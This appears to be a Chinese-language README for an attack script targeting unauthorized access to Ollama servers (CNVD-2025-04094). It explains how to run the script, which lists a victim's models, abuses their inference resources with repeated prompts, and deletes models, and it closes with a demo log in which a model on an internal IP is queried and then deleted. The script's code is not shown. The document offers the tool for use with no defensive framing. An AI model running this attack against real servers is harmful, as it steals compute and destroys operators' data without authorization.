## 概述
`exp_ollama_models.py` 是一个用于与 Ollama 服务交互的攻击脚本，可用于攻击 Ollama 服务的未授权访问漏洞（CNVD-2025-04094）。该脚本提供了三种主要功能：打印当前模型列表、滥用模型推理资源和删除推理模型。

## 环境要求
- **Python 版本**：Python 3.x
- **依赖库**：`requests`、`json`

你可以使用以下命令安装所需的 `requests` 库：
```bash
pip install requests
```

## 使用方法
### 启动脚本
在命令行中，导航到脚本所在的目录，然后运行以下命令启动脚本：
```bash
python exp_ollama_models.py
```

### 操作步骤
1. **输入 Ollama 服务的 IP 地址**：启动脚本后，会提示你输入 Ollama 服务的 IP 地址。输入正确的 IP 地址后按回车键。
2. **选择操作**：输入 IP 地址后，会显示一个操作菜单，包含以下选项：
    - `1. 打印当前模型列表`：列出 Ollama 服务中的所有模型。
    - `2. 滥用模型推理资源`：向指定模型发送请求，尝试滥用其推理资源。
    - `3. 删除推理模型`：从 Ollama 服务中删除指定的模型。
    - `4. 退出`：退出脚本。

### 具体操作说明

#### 打印当前模型列表
选择 `1` 后，脚本会向 Ollama 服务发送请求，并打印出所有可用的模型名称。如果无法连接到服务或服务返回无效数据，会输出相应的错误信息。

#### 滥用模型推理资源
选择 `2` 后，需要依次输入要滥用的模型名称和 `prompt`。输入 `prompt` 时，输入 `q` 并按回车键可停止滥用流程，否则会不断向模型发送请求。

#### 删除推理模型
选择 `3` 后，需要输入要删除的模型名称。脚本会尝试删除该模型，并在成功删除后输出相应的提示信息。如果删除失败，会输出错误信息。

#### 退出
选择 `4` 后，脚本会终止运行。


### 攻击演示
```plaintext
python .\exp_ollama_models.py
请输入 Ollama 服务的 IP 地址: 10.1.2.40
请选择操作：       
1. 打印当前模型列表
2. 滥用模型推理资源
3. 删除推理模型    
4. 退出
请输入选项编号: 1  
Ollama 服务中的模型列表：
deepseek-r1:1.5b   

请选择操作：
1. 打印当前模型列表
2. 滥用模型推理资源
3. 删除推理模型    
4. 退出

请输入选项编号: 2
请输入要滥用的模型名称: deepseek-r1:1.5b
请输入 prompt（输入 'q' 退出）: 你是谁？
{"model":"deepseek-r1:1.5b","created_at":"2025-05-21T07:38:39.1609434Z","message":{"role":"assistant","content":"\u003cthink\u003e\n\n\u003c/think\u003e\n\n您好！我是由中国的深度求索（DeepSeek）公司开
发的智能助手DeepSeek-R1。如您有任何任何问题，我会尽我所能为您提供帮助。"},"done_reason":"stop","done":true,"total_duration":36407610000,"load_duration":4422330200,"prompt_eval_count":6,"prompt_eval_duration":2358000000,"eval_count":40,"eval_duration":29620000000}

请输入 prompt（输入 'q' 退出）: q

请选择操作：
1. 打印当前模型列表
2. 滥用模型推理资源
3. 删除推理模型
4. 退出

输入选项编号: 3
请输入要删除的模型名称: deepseek-r1:1.5b
模型 deepseek-r1:1.5b 已成功删除。

请选择操作：
1. 打印当前模型列表
2. 滥用模型推理资源
3. 删除推理模型
4. 退出
请输入选项编号: 1
请输入选项编号: 1
Ollama 服务中的模型列表：

请选择操作：
1. 打印当前模型列表
2. 滥用模型推理资源
3. 删除推理模型
4. 退出
请输入选项编号: 4
退出程序。
```